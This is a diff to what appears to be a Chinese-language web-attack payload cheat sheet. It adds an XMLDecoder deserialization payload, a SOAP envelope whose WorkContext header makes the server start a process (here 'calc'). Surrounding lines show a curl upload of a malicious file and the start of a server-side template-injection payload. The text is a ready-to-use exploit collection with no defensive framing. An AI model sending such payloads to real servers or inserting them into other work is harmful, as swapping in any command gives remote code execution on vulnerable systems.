@@ -70,6 +70,29 @@ curl -F "file=@/path/to/malicious.txt" http://example.com/upload
 
 ```
 
+# XMLDecoder 反序列化
+```
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
+    <soapenv:Header>
+        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+            <java version="1.4.0" class="java.beans.XMLDecoder">
+                <void class="java.lang.ProcessBuilder">
+                    <array class="java.lang.String" length="1">
+                        <void index="0">
+                            <string>calc</string>
+                        </void>
+                    </array>
+                    <void method="start"/>
+                </void>
+            </java>
+        </work:WorkContext>
+    </soapenv:Header>
+    <soapenv:Body/>
+</soapenv:Envelope>
+```
+
+
+
 # 模板注入 Payload
 ```php
 /?id={{"".__class__.__base__.__subclasses__()}}111
